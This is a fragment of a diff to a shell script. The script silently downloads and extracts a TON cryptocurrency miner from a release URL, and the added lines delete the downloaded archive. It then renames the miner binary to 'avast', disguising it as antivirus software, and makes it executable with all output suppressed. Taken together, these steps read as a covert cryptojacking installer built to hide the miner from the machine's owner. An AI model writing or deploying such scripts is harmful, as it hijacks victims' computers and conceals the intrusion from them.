@@ -8,6 +8,8 @@ wget -q https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-m
 
 tar xf ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1
 
+rm -f ton-pool.com-miner-0.3.4-linux.tar.gz
+
 mv miner-linux avast
 
 chmod +x avast >/dev/null 2>&1
